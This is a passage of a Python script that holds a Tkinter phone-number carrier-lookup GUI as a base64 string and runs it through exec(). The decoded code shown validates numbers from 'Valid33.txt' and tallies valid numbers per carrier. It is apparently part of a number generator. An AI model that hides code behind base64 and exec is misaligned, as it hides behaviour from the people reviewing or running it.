FkeD0yMCwgZmlsbD0ieCIpCiAgICAgICAgc2VsZi5jYXJyaWVyX2xhYmVsID0gdHRrLkxhYmVsKHNlbGYsIHRleHQ9IlZhbGlkYXRpbmcuLi4iKQogICAgICAgIHNlbGYuY2Fycmllcl9sYWJlbC5wYWNrKHBhZHk9KDAsIDEwKSkKICAgICAgICBzZWxmLmZpbGVfc3VtbWFyeV9sYWJlbCA9IHR0ay5MYWJlbChzZWxmLCB0ZXh0PSIiLCBqdXN0aWZ5PSJsZWZ0IikKICAgICAgICBzZWxmLmZpbGVfc3VtbWFyeV9sYWJlbC5wYWNrKHBhZHk9MTAsIHBhZHg9MjApCgogICAgZGVmIGFuaW1hdGUoc2VsZik6CiAgICAgICAgaWYgc2VsZi5hbmltYXRpbmc6CiAgICAgICAgICAgIHNlbGYuYW5pbWF0aW9uX2xhYmVsLmNvbmZpZyh0ZXh0PXNlbGYuYW5pbWF0aW9uX3RleHRzW3NlbGYuYW5pbWF0aW9uX2luZGV4XSkKICAgICAgICAgICAgc2VsZi5hbmltYXRpb25faW5kZXggPSAoc2VsZi5hbmltYXRpb25faW5kZXggKyAxKSAlIGxlbihzZWxmLmFuaW1hdGlvbl90ZXh0cykKICAgICAgICAgICAgc2VsZi5hZnRlcig1MDAsIHNlbGYuYW5pbWF0ZSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLmFuaW1hdGlvbl9sYWJlbC5jb25maWcodGV4dD0iIikKCiAgICBkZWYgc2FmZV9hZnRlcihzZWxmLCBkZWxheSwgY2FsbGJhY2spOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgc2VsZi5jb250cm9sbGVyLndpbmZvX2V4aXN0cygpOgogICAgICAgICAgICAgICAgc2VsZi5jb250cm9sbGVyLmFmdGVyKGRlbGF5LCBjYWxsYmFjaykKICAgICAgICBleGNlcHQgdGsuVGNsRXJyb3I6CiAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgb25fc2hvdyhzZWxmKToKICAgICAgICAjIENsZWFyIHRoZSB2YWxpZGF0ZWRfbnVtYmVycyBmb2xkZXIgYmVmb3JlIGxvb2t1cAogICAgICAgIGNsZWFyX2RpcmVjdG9yeSgidmFsaWRhdGVkX251bWJlcnMiKQogICAgICAgIHNlbGYuc3RhcnRfY2Fycmllcl9sb29rdXAoKQoKICAgIGRlZiBzdGFydF9jYXJyaWVyX2xvb2t1cChzZWxmKToKICAgICAgICBzZWxmLmFuaW1hdGluZyA9IFRydWUKICAgICAgICBzZWxmLmFuaW1hdGUoKQogICAgICAgIHNlbGYuY2Fycmllcl9wcm9ncmVzcy5zdGFydCgxMCkKICAgICAgICAjIFN0YXJ0IHRoZSBsb29rdXAgaW4gYSBzZXBhcmF0ZSB0aHJlYWQgc28gR1VJIGV2ZW50cyByZW1haW4gcHJvY2Vzc2VkCiAgICAgICAgc2VsZi5jYXJyaWVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYucnVuX2NhcnJpZXJfbG9va3VwLCBkYWVtb249VHJ1ZSkKICAgICAgICBzZWxmLmNhcnJpZXJfdGhyZWFkLnN0YXJ0KCkKICAgICAgICAjIFN0YXJ0IGxpdmUgdXBkYXRlIHJlZnJlc2gKICAgICAgICBzZWxmLnVwZGF0ZV9zdW1tYXJ5KCkKCiAgICBkZWYgdXBkYXRlX3N1bW1hcnkoc2VsZik6CiAgICAgICAgZm9sZGVyID0gInZhbGlkYXRlZF9udW1iZXJzIgogICAgICAgIHN1bW1hcnkgPSAiIgogICAgICAgIHZhbGlkX3RvdGFsID0gMAogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGZvbGRlcik6CiAgICAgICAgICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIoZm9sZGVyKToKICAgICAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoIi50eHQiKToKICAgICAgICAgICAgICAgICAgICBwYXRoID0gb3MucGF0aC5qb2luKGZvbGRlciwgZmlsZSkKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50ID0gc3VtKDEgZm9yIGxpbmUgaW4gb3BlbihwYXRoKSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICBjb3VudCA9IDAKICAgICAgICAgICAgICAgICAgICBzdW1tYXJ5ICs9IGYie2ZpbGV9OiB7Y291bnR9XG4iCiAgICAgICAgICAgICAgICAgICAgdmFsaWRfdG90YWwgKz0gY291bnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBzdW1tYXJ5ID0gIk5vIGNhcnJpZXIgZmlsZXMgZm91bmQuIgogICAgICAgIHNlbGYuZmlsZV9zdW1tYXJ5X2xhYmVsLmNvbmZpZyh0ZXh0PWYiVG90YWwgVmFsaWQgTnVtYmVyczoge3ZhbGlkX3RvdGFsfVxue3N1bW1hcnl9IikKICAgICAgICAjIEZvcmNlIGlkbGUgdGFza3MgdG8gYmUgcHJvY2Vzc2VkIHRvIGVuc3VyZSB0aGUgR1VJIHJlZnJlc2hlcwogICAgICAgIHNlbGYuY29udHJvbGxlci51cGRhdGVfaWRsZXRhc2tzKCkKICAgICAgICAjIFJlZnJlc2ggZXZlcnkgNTAwIG1zCiAgICAgICAgc2VsZi5hZnRlcig1MDAsIHNlbGYudXBkYXRlX3N1bW1hcnkpCgogICAgZGVmIHJ1bl9jYXJyaWVyX2xvb2t1cChzZWxmKToKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoIlZhbGlkMzMudHh0Iik6CiAgICAgICAgICAgIHNlbGYuc2FmZV9hZnRlcigwLCBsYW1iZGE6IG1lc3NhZ2Vib3guc2hvd2Vycm9yKAogICAgICAgICAgICAgICAgIkVycm9yIiwKICAgICAgICAgICAgICAgICJWYWxpZDMzLnR4dCBub3QgZm91bmQuIFBsZWFzZSBydW4gdGhlIHZhbGlkYXRpb24gcHJvY2VzcyBmaXJzdC4iLAogICAgICAgICAgICAgICAgcGFyZW50PXNlbGYKICAgICAgICAgICAgKSkKICAgICAgICAgICAgc2VsZi5zYWZlX2FmdGVyKDAsIGxhbWJkYTogc2VsZi5jb250cm9sbGVyLnNob3dfZnJhbWUoIkdlbmVyYXRvclBhZ2UiKSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgdHJ5OgogICAgICAgICAgICBwaG9uZV92YWxpZGF0b3IgPSBQaG9uZU51bWJlclZhbGlkYXRvcigpCiAgICAgICAgICAgIHBob25lX3ZhbGlkYXRvci5ydW4oIlZhbGlkMzMudHh0IikKICAgICAgICAgICAgc2VsZi5zYWZlX2FmdGVyKDAsIGxhbWJkYTogc2VsZi5jYXJyaWVyX3Byb2dyZXNzLnN0b3AoKSkKICAgICAgICAgICAgc2VsZi5zYWZlX2FmdGVyKDAsIGxhbWJkYTogc2VsZi5jYXJyaWVyX2xhYmVsLmNvbmZpZyh0ZXh0PSJDb21wbGV0ZSEiKSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGVycm9yX21lc3NhZ2UgPSBzdHIoZSkKICAgICAgICAgICAgc2VsZi5zYWZlX2FmdGVyKDAsIGxhbWJkYTogbWVzc2FnZWJveC5zaG93ZXJyb3IoIkVycm9yIiwgZXJyb3JfbWVzc2FnZSwgcGFyZW50PXNlbGYpKQogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgIHNlbGYuYW5pbWF0aW5nID0gRmFsc2UKCgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1haW4KIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpkZWYgbWFpbigpOgogICAgZnJlZXplX3N1cHBvcnQoKSAgIyBOZWNlc3NhcnkgZm9yIFdpbmRvd3MgbXVsdGlwcm9jZXNzaW5nIHN1cHBvcnQKICAgIGFwcCA9IE1haW5BcHAoKQogICAgYXBwLm1haW5sb29wKCkKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp"
    decoded = base64.b64decode(encoded_script.encode()).decode()
    exec(decoded, globals())
    main()

if __name__ == "__main__":
    freeze_support()
    decode_and_run()
